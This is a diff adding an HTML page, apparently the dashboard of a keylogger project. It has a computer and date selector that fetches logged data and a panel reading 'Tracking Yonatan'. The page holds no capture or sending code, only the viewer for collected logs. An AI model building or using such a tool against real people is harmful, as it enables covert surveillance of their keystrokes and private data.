@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Bungee+Shade&family=Inter:wght@700&family=Josefin+Sans:wght@200&family=Poppins:wght@100&family=Rubik+Iso&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/static/css/style.css">
+
+  </head>
+<body>
+    <div class="container">
+        <div>
+            <h1 class="rubik-iso-regular">KEYLOGGER</h1>
+            <div id="animation" style="width: 50px;">
+              <img src="/static/svg/animation.svg" alt="">
+            </div>
+        </div>
+        <div class="cyber-card cyber-border flex">
+            <div class="search-card">
+                <input id="inp" class="input-search" name="search" placeholder="Type your text"/>
+            </div>
+            <button id="btn" onclick="myFunc()" class="cyber-button">search</button>
+        </div>
+        <div class="flex">
+            <div class="cyber-card cyber-border half">
+                <h1>result</h1>
+                <h1 id="result">0</h1>
+            </div>
+            <div class="cyber-card cyber-border half">
+                <h1 id="Following" class="Following">Tracking</h1>
+                <h1 id="Following" class="Following">Yonatan</h1>
+            </div>
+        </div>
+    </div>
+    <select class="selection cyber-card cyber-border flex">
+        <option class="cyber-text-glow" value="1">0001</option>
+        <option class="cyber-text-glow" value="2">0002</option>
+        <option class="cyber-text-glow" value="3">0003</option>
+        <option class="cyber-text-glow" value="4">0004</option>
+    </select>  
+    
+   
+    <div id="stop-btn" class="flex center">
+        <button id="start" class="sircle-card flex center">
+            <h1 id="text-start-button">start</h1>
+        </button>
+    </div>
+    <form action="" onsubmit="fetchDataFromForm(event)">
+        <label>בחר מחשב:</label>
+        <select id="computer">
+          <option value="computer1">Computer 1</option>
+          <option value="computer2">Computer 2</option>
+        </select>
+      
+        <label>בחר תאריך:</label>
+        <input type="date" id="date">
+      
+        <button type="submit">טען נתונים</button>
+      </form>
+      
+      <div id="result-data"></div>
+      
+      <script>
+        function fetchDataFromForm(event) {
+          event.preventDefault(); // מונע רענון של הדף
+          const computer = document.getElementById("computer").value;
+          const day = document.getElementById("date").value;
+      
+          fetch(`/${computer}/${day}`)
+            .then(response => {
+              if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+              }
+              return response.json();
+            })
+            .then(data => {
+              document.getElementById("result-data").innerHTML =
+                "<pre>" + JSON.stringify(data, null, 4) + "</pre>";
+            })
+            .catch(error => console.error('Error:', error));
+        }
+      </script>
+      
+    
+    
+    
+      <script src="/static/js/index.js"></script>
+    </body>
+</html>
